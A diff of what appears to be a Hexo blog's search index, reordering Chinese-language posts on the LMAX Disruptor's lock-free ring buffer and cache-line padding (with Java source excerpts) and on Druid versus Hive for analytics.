@@ -212,65 +212,35 @@
       </tags>
   </entry>
   <entry>
-    <title>disrupt 实现原理</title>
-    <url>/disrupt.html</url>
-    <content><![CDATA[<h2 id="一、Disruptor-简介"><a href="#一、Disruptor-简介" class="headerlink" title="一、Disruptor 简介"></a>一、Disruptor 简介</h2><p>线程间通讯框架，实现多线程共享数据。是一个高性能无锁队列，由英国外汇交易公司 LMAX 开发。</p>
-<p>性能测试：<a href="https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results">https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results</a></p>
-<span id="more"></span>
-
-<h2 id="二、Disruptor-为什么这么快"><a href="#二、Disruptor-为什么这么快" class="headerlink" title="二、Disruptor 为什么这么快"></a>二、Disruptor 为什么这么快</h2><h3 id="2-1-无锁操作"><a href="#2-1-无锁操作" class="headerlink" title="2.1 无锁操作"></a>2.1 无锁操作</h3><p>生产数据消费数据都是通过申请序列，申请成功后才可以继续操作。而申请序列的操作时通过 CAS + LockSupport 完成的。</p>
-<h3 id="2-2-消除伪共享"><a href="#2-2-消除伪共享" class="headerlink" title="2.2 消除伪共享"></a>2.2 消除伪共享</h3><p>通过填充数据方式来实现消除伪共享</p>
-<h4 id="2-2-1-什么是伪共享"><a href="#2-2-1-什么是伪共享" class="headerlink" title="2.2.1 什么是伪共享"></a>2.2.1 什么是伪共享</h4><p>cpu 三级缓存架构如下</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor.png" alt="cpu 三级缓存"></p>
-<p>thread1 和 thread2 读取数据会覆盖 cpu cache line</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor1.png" alt="伪共享"></p>
-<h4 id="2-2-2-通过数据填充消除伪共享"><a href="#2-2-2-通过数据填充消除伪共享" class="headerlink" title="2.2.2 通过数据填充消除伪共享"></a>2.2.2 通过数据填充消除伪共享</h4><p>通过填充数据，使数据长度恰好等于一个缓存行长度（64 字节 or 128 字节），这样数据占据整个缓存行，就不会被别的数据覆盖。</p>
-<p>Disruptor 中的 Sequence 序列号对象，通过先后数据填充，变为 128 个字节，实现伪共享消除的。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p1, p2, p3, p4, p5, p6, p7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Value</span> <span class="keyword">extends</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">volatile</span> <span class="keyword">long</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RhsPadding</span> <span class="keyword">extends</span> <span class="title">Value</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p9, p10, p11, p12, p13, p14, p15;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sequence</span> <span class="keyword">extends</span> <span class="title">RhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> INITIAL_VALUE = -<span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe UNSAFE;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> VALUE_OFFSET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过前置p1<del>p7，后置p9</del>p15填充缓存行，防止缓冲行共享。一般的处理器架构缓存行是64字节，但是有个处理器架构是128字节，所以采用前后填充，能够实现在所有处理器上消除伪共享。</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor2.png" alt="缓存行"></p>
-<h3 id="2-3-环形-buffer"><a href="#2-3-环形-buffer" class="headerlink" title="2.3 环形 buffer"></a>2.3 环形 buffer</h3><p>内部采用数组存储数据，充分利用内存局部性原理。</p>
-<p>只使用一个指针来表示可用数据，没有头尾指针。消除头尾指针竞争。各个生产者消费者只需要申请自己的序列号，就可以进行操作了。不存在竞争同一资源。</p>
-<p>bufferSize 是 2 的 n 次幂，通过 sequence &amp; (2^n -1) 来计算索引。</p>
-<p>通过数据覆盖，不需要删除数据，无需 GC。</p>
-<h2 id="三、Disruptor-如何工作"><a href="#三、Disruptor-如何工作" class="headerlink" title="三、Disruptor 如何工作"></a>三、Disruptor 如何工作</h2><h3 id="3-1-消费者端"><a href="#3-1-消费者端" class="headerlink" title="3.1 消费者端"></a>3.1 消费者端</h3><p>每个消费者都对应一个 ConsumerBarrier，消费者通过 ConsumerBarrier 与 Disruptor 交互。消费者通过 ConsumerBarrier 获取下一个可以消费的序列号，然后开始消费。比如消费者 A 当前消费的序列号是8，通过 ConsumerBarrier 获取下一个可消费的序列号是 12，那么消费者 A 可以批量消费序列号 9，10，11，12 的数据。</p>
-<p><strong>消费者消费数据步骤：1.获取序列号，2.消费数据</strong></p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor3.png" alt="消费者消费步骤"></p>
-<h3 id="3-2-生产者端"><a href="#3-2-生产者端" class="headerlink" title="3.2 生产者端"></a>3.2 生产者端</h3><p>多个生产者对应一个 Sequencer，也就是说多个生产者共用一个序列号。</p>
-<p><strong>生产者生产数据步骤：1.申请序列号，2.填充数据，3.发布</strong></p>
-<p>生产者 A 和生产者 B <strong>同时生产</strong>数据，如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor4.png" alt="生产者1"></p>
-<p>生产者 A <strong>讯轮阻塞</strong> 等待消费者 A，如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor5.png" alt="生产者2"></p>
-<p>消费者 A <strong>轮训非阻塞</strong> 等待生产者 B，如下图：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor6.png" alt="生产者3"></p>
-<h2 id="四、源码导读"><a href="#四、源码导读" class="headerlink" title="四、源码导读"></a>四、源码导读</h2><h3 id="4-1-核心类"><a href="#4-1-核心类" class="headerlink" title="4.1 核心类"></a>4.1 核心类</h3><p><a href="https://github.com/LMAX-Exchange/disruptor/wiki/Introduction">https://github.com/LMAX-Exchange/disruptor/wiki/Introduction</a></p>
-<p>ringbuff上有指针，每个消费者都维护自己的一个指针，生产者共用一个指针。指针是由 Sequencer类来控制的假设buffsize=8，如果消费者在消费id7，生产者将生产id15（15-buffsize=7），是同一个位置，生产者阻塞，如果生产者在生产id7，消费者在消费id7，消费者阻塞</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/162762019.png" alt="流程图"></p>
-<h3 id="4-2-生产者端"><a href="#4-2-生产者端" class="headerlink" title="4.2 生产者端"></a>4.2 生产者端</h3><h4 id="4-2-1-申请序号"><a href="#4-2-1-申请序号" class="headerlink" title="4.2.1 申请序号"></a>4.2.1 申请序号</h4><p>调用 Sequencer#get ，直接看多生产者如果申请序号的</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">next</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;n must be &gt; 0&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> current;</span><br><span class="line">  <span class="keyword">long</span> next;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 获取当前发布序号</span></span><br><span class="line">    current = cursor.get();</span><br><span class="line">    next = current + n;</span><br><span class="line">		</span><br><span class="line">    <span class="keyword">long</span> wrapPoint = next - bufferSize;</span><br><span class="line">    <span class="comment">// gatingSequenceCache 这是 gatingSequence 的缓存，存入的是最小的消费者消费序列（有多个消费者）</span></span><br><span class="line">    <span class="keyword">long</span> cachedGatingSequence = gatingSequenceCache.get();</span><br><span class="line">		<span class="comment">// 生产者要覆盖未被消费的数据（生产者超过消费者一圈了）</span></span><br><span class="line">    <span class="keyword">if</span> (wrapPoint &gt; cachedGatingSequence || cachedGatingSequence &gt; current)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 获取最小的消费者序列</span></span><br><span class="line">      <span class="keyword">long</span> gatingSequence = Util.getMinimumSequence(gatingSequences, current);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (wrapPoint &gt; gatingSequence)</span><br><span class="line">      &#123;</span><br><span class="line">        LockSupport.parkNanos(<span class="number">1</span>); <span class="comment">// TODO, should we spin based on the wait strategy?</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">			<span class="comment">// 更新缓存</span></span><br><span class="line">      gatingSequenceCache.set(gatingSequence);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cursor.compareAndSet(current, next))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-2-2-写入数据"><a href="#4-2-2-写入数据" class="headerlink" title="4.2.2 写入数据"></a>4.2.2 写入数据</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> (E)entries[(<span class="keyword">int</span>)sequence &amp; indexMask];</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// dosomething</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="4-2-3发布"><a href="#4-2-3发布" class="headerlink" title="4.2.3发布"></a>4.2.3发布</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">publish</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 将待发布的序列设为可用，这样消费者就可以消费这个序列了</span></span><br><span class="line">  setAvailable(sequence);</span><br><span class="line">  waitStrategy.signalAllWhenBlocking();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-3-消费者端"><a href="#4-3-消费者端" class="headerlink" title="4.3 消费者端"></a>4.3 消费者端</h3><p>Disruptor#start 启动，会在线程池里启动 EventProcessor，每个 EventHandler 对应一个 EventProcessor</p>
-<p>BatchEventProcessor 是 EventProcessor 的实现类，run方法里会轮训，是否有 event 可以被消费，如果可以就调用 EventHandler#onEvent 方法，触发消费者事件。</p>
-<p>重点看 BatchEventProcessor#run 方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 状态设为启动，是一个AtomicBoolean</span></span><br><span class="line">  <span class="keyword">if</span> (!running.compareAndSet(<span class="keyword">false</span>, <span class="keyword">true</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Thread is already running&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 清除中断</span></span><br><span class="line">  sequenceBarrier.clearAlert();</span><br><span class="line">	<span class="comment">// 判断一下消费者是否实现了LifecycleAware ,如果实现了这个接口，那么此时会发送一个启动通知</span></span><br><span class="line">  notifyStart();</span><br><span class="line"></span><br><span class="line">  T event = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">long</span> nextSequence = sequence.get() + <span class="number">1L</span>;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 获取最大可用的序号，表示在之前的都可以安全消费</span></span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">long</span> availableSequence = sequenceBarrier.waitFor(nextSequence);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (nextSequence &lt;= availableSequence)</span><br><span class="line">        &#123;</span><br><span class="line">          event = dataProvider.get(nextSequence);</span><br><span class="line">          eventHandler.onEvent(event, nextSequence, nextSequence == availableSequence);</span><br><span class="line">          nextSequence++;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 记录对应消费者消费到哪里</span></span><br><span class="line">        sequence.set(availableSequence);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> TimeoutException e)</span><br><span class="line">      &#123;</span><br><span class="line">        notifyTimeout(sequence.get());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> AlertException ex)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果任务停止，就退出</span></span><br><span class="line">        <span class="keyword">if</span> (!running.get())</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (<span class="keyword">final</span> Throwable ex)</span><br><span class="line">      &#123;</span><br><span class="line">        exceptionHandler.handleEventException(ex, nextSequence, event);</span><br><span class="line">        sequence.set(nextSequence);</span><br><span class="line">        nextSequence++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">finally</span></span><br><span class="line">  &#123;</span><br><span class="line">    notifyShutdown();</span><br><span class="line">    <span class="comment">// 任务关闭</span></span><br><span class="line">    running.set(<span class="keyword">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>消费者在消费时候，需要判断其最大可消费的序列号，这个最大可消费序列号是通过 SequenceBarrier#waitFor 方法来实现的</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">waitFor</span><span class="params">(<span class="keyword">final</span> <span class="keyword">long</span> sequence)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> AlertException, InterruptedException, TimeoutException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    		<span class="comment">// 判断是否中断，如果中断就抛出异常，这样上层捕捉，就可以停止 BatchEventProcessor</span></span><br><span class="line">        checkAlert();</span><br><span class="line">				<span class="comment">// 根据不同的策略获取可用的序列</span></span><br><span class="line">        <span class="keyword">long</span> availableSequence = waitStrategy.waitFor(sequence, cursorSequence, dependentSequence, <span class="keyword">this</span>);</span><br><span class="line">				<span class="comment">// 可用序列比申请的序列小，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (availableSequence &lt; sequence)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> availableSequence;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="comment">// 如果是单生产者，直接返回 availableSequence；对于多生产者判断是否可用，不可用返回sequence-1</span></span><br><span class="line">        <span class="keyword">return</span> sequencer.getHighestPublishedSequence(sequence, availableSequence);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p><a href="https://github.com/LMAX-Exchange/disruptor">https://github.com/LMAX-Exchange/disruptor</a></p>
+    <title>druid-vs-hive</title>
+    <url>/druid-vs-hive.html</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>druid 用于实时查询，粗粒度的查询。hive 用于离线查询，细粒度的查询，比如查询某个用户的数据</p>
+<h2 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h2><p>Druid 是 MetaMarket 公司研发，专为海量数据集上的做高性能 OLAP (OnLine Analysis Processing)而设计的数据存储和分析系统。主要解决的是对于大量的基于时序的数据进行聚合查询。数据可以实时摄入，进入到 druid 后立即可查。</p>
+<p>Keyword: 分布式、列式存储、实时分析、PB级、聚合查询</p>
+<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251731981" alt="img"></p>
+<ul>
+<li>realtime 组件负责数据的实时摄入。</li>
+<li>broker 组件负责查询任务的分发以及查询结果的汇总，并将结果返回给用户</li>
+<li>historical 组件负责索引后的历史数据的存储，数据存储在 deep storage。deep storage 可以是本地，也可以是 HDFS 等分布式文件系统</li>
+</ul>
+<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据的插入频率非常高，但是更新频率非常低。大部分的查询为聚合查询（aggregation）和报表查询（reporting queries），例如监控系统</p>
+<h2 id="hive"><a href="#hive" class="headerlink" title="hive"></a>hive</h2><p>Hive 由 FaceBook 开发，用于解决海量结构化日志的数据统计。依赖 HDFS 存储数据，依赖 MapReduce 处理数据。Hive 的执行延迟比较高，因此常用于数据分析，对实时性要求不高的场合。架构图如下</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251719767.png" alt="架构"></p>
+<h3 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据汇总：每天/每周用户点击数，流量统计</p>
+<p>非实时分析：日志分析；文本分析</p>
+<p>数据仓库：数据抽取，加载，转换（ETL）</p>
+<p>数据挖掘：用户行为分析；兴趣分区；区域展示</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices">https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices</a></p>
+<p><a href="https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</a></p>
+<p><a href="https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5">https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5</a></p>
 ]]></content>
       <categories>
-        <category>java</category>
+        <category>大数据</category>
       </categories>
       <tags>
-        <tag>源码</tag>
-        <tag>disruptor</tag>
+        <tag>druid</tag>
+        <tag>hive</tag>
+        <tag>大数据</tag>
       </tags>
   </entry>
   <entry>
@@ -419,38 +389,6 @@
       </tags>
   </entry>
   <entry>
-    <title>druid-vs-hive</title>
-    <url>/druid-vs-hive.html</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>druid 用于实时查询，粗粒度的查询。hive 用于离线查询，细粒度的查询，比如查询某个用户的数据</p>
-<h2 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h2><p>Druid 是 MetaMarket 公司研发，专为海量数据集上的做高性能 OLAP (OnLine Analysis Processing)而设计的数据存储和分析系统。主要解决的是对于大量的基于时序的数据进行聚合查询。数据可以实时摄入，进入到 druid 后立即可查。</p>
-<p>Keyword: 分布式、列式存储、实时分析、PB级、聚合查询</p>
-<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251731981" alt="img"></p>
-<ul>
-<li>realtime 组件负责数据的实时摄入。</li>
-<li>broker 组件负责查询任务的分发以及查询结果的汇总，并将结果返回给用户</li>
-<li>historical 组件负责索引后的历史数据的存储，数据存储在 deep storage。deep storage 可以是本地，也可以是 HDFS 等分布式文件系统</li>
-</ul>
-<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据的插入频率非常高，但是更新频率非常低。大部分的查询为聚合查询（aggregation）和报表查询（reporting queries），例如监控系统</p>
-<h2 id="hive"><a href="#hive" class="headerlink" title="hive"></a>hive</h2><p>Hive 由 FaceBook 开发，用于解决海量结构化日志的数据统计。依赖 HDFS 存储数据，依赖 MapReduce 处理数据。Hive 的执行延迟比较高，因此常用于数据分析，对实时性要求不高的场合。架构图如下</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/zhouxinghang/resources/Zblog/202111251719767.png" alt="架构"></p>
-<h3 id="使用场景-1"><a href="#使用场景-1" class="headerlink" title="使用场景"></a>使用场景</h3><p>数据汇总：每天/每周用户点击数，流量统计</p>
-<p>非实时分析：日志分析；文本分析</p>
-<p>数据仓库：数据抽取，加载，转换（ETL）</p>
-<p>数据挖掘：用户行为分析；兴趣分区；区域展示</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices">https://www.slideshare.net/Hadoop_Summit/druid-and-hive-together-use-cases-and-best-practices</a></p>
-<p><a href="https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</a></p>
-<p><a href="https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5">https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5</a></p>
-]]></content>
-      <categories>
-        <category>大数据</category>
-      </categories>
-      <tags>
-        <tag>druid</tag>
-        <tag>hive</tag>
-        <tag>大数据</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>伪共享</title>
     <url>/false-sharing.html</url>
     <content><![CDATA[<h3 id="伪共享"><a href="#伪共享" class="headerlink" title="伪共享"></a>伪共享</h3><p>在 cpu 和 内存之间有高速缓存区（cache）,cache 一般集成在 cpu 内部，也叫做 cpu Cache。如下图是一个二级缓存示意图。<br><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/file.png" alt="二级缓存示意图"></p>
@@ -466,6 +404,68 @@
       <tags>
         <tag>java</tag>
         <tag>并发编程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>disrupt 实现原理</title>
+    <url>/disrupt.html</url>
+    <content><![CDATA[<h2 id="一、Disruptor-简介"><a href="#一、Disruptor-简介" class="headerlink" title="一、Disruptor 简介"></a>一、Disruptor 简介</h2><p>线程间通讯框架，实现多线程共享数据。是一个高性能无锁队列，由英国外汇交易公司 LMAX 开发。</p>
+<p>性能测试：<a href="https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results">https://github.com/LMAX-Exchange/disruptor/wiki/Performance-Results</a></p>
+<span id="more"></span>
+
+<h2 id="二、Disruptor-为什么这么快"><a href="#二、Disruptor-为什么这么快" class="headerlink" title="二、Disruptor 为什么这么快"></a>二、Disruptor 为什么这么快</h2><h3 id="2-1-无锁操作"><a href="#2-1-无锁操作" class="headerlink" title="2.1 无锁操作"></a>2.1 无锁操作</h3><p>生产数据消费数据都是通过申请序列，申请成功后才可以继续操作。而申请序列的操作时通过 CAS + LockSupport 完成的。</p>
+<h3 id="2-2-消除伪共享"><a href="#2-2-消除伪共享" class="headerlink" title="2.2 消除伪共享"></a>2.2 消除伪共享</h3><p>通过填充数据方式来实现消除伪共享</p>
+<h4 id="2-2-1-什么是伪共享"><a href="#2-2-1-什么是伪共享" class="headerlink" title="2.2.1 什么是伪共享"></a>2.2.1 什么是伪共享</h4><p>cpu 三级缓存架构如下</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor.png" alt="cpu 三级缓存"></p>
+<p>thread1 和 thread2 读取数据会覆盖 cpu cache line</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor1.png" alt="伪共享"></p>
+<h4 id="2-2-2-通过数据填充消除伪共享"><a href="#2-2-2-通过数据填充消除伪共享" class="headerlink" title="2.2.2 通过数据填充消除伪共享"></a>2.2.2 通过数据填充消除伪共享</h4><p>通过填充数据，使数据长度恰好等于一个缓存行长度（64 字节 or 128 字节），这样数据占据整个缓存行，就不会被别的数据覆盖。</p>
+<p>Disruptor 中的 Sequence 序列号对象，通过先后数据填充，变为 128 个字节，实现伪共享消除的。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p1, p2, p3, p4, p5, p6, p7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Value</span> <span class="keyword">extends</span> <span class="title">LhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">volatile</span> <span class="keyword">long</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RhsPadding</span> <span class="keyword">extends</span> <span class="title">Value</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">long</span> p9, p10, p11, p12, p13, p14, p15;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sequence</span> <span class="keyword">extends</span> <span class="title">RhsPadding</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> INITIAL_VALUE = -<span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe UNSAFE;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> VALUE_OFFSET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过前置p1<del>p7，后置p9</del>p15填充缓存行，防止缓冲行共享。一般的处理器架构缓存行是64字节，但是有个处理器架构是128字节，所以采用前后填充，能够实现在所有处理器上消除伪共享。</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor2.png" alt="缓存行"></p>
+<h3 id="2-3-环形-buffer"><a href="#2-3-环形-buffer" class="headerlink" title="2.3 环形 buffer"></a>2.3 环形 buffer</h3><p>内部采用数组存储数据，充分利用内存局部性原理。</p>
+<p>只使用一个指针来表示可用数据，没有头尾指针。消除头尾指针竞争。各个生产者消费者只需要申请自己的序列号，就可以进行操作了。不存在竞争同一资源。</p>
+<p>bufferSize 是 2 的 n 次幂，通过 sequence &amp; (2^n -1) 来计算索引。</p>
+<p>通过数据覆盖，不需要删除数据，无需 GC。</p>
+<h2 id="三、Disruptor-如何工作"><a href="#三、Disruptor-如何工作" class="headerlink" title="三、Disruptor 如何工作"></a>三、Disruptor 如何工作</h2><h3 id="3-1-消费者端"><a href="#3-1-消费者端" class="headerlink" title="3.1 消费者端"></a>3.1 消费者端</h3><p>每个消费者都对应一个 ConsumerBarrier，消费者通过 ConsumerBarrier 与 Disruptor 交互。消费者通过 ConsumerBarrier 获取下一个可以消费的序列号，然后开始消费。比如消费者 A 当前消费的序列号是8，通过 ConsumerBarrier 获取下一个可消费的序列号是 12，那么消费者 A 可以批量消费序列号 9，10，11，12 的数据。</p>
+<p><strong>消费者消费数据步骤：1.获取序列号，2.消费数据</strong></p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor3.png" alt="消费者消费步骤"></p>
+<h3 id="3-2-生产者端"><a href="#3-2-生产者端" class="headerlink" title="3.2 生产者端"></a>3.2 生产者端</h3><p>多个生产者对应一个 Sequencer，也就是说多个生产者共用一个序列号。</p>
+<p><strong>生产者生产数据步骤：1.申请序列号，2.填充数据，3.发布</strong></p>
+<p>生产者 A 和生产者 B <strong>同时生产</strong>数据，如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor4.png" alt="生产者1"></p>
+<p>生产者 A <strong>讯轮阻塞</strong> 等待消费者 A，如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor5.png" alt="生产者2"></p>
+<p>消费者 A <strong>轮训非阻塞</strong> 等待生产者 B，如下图：</p>
+<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/disruptor6.png" alt="生产者3"></p>
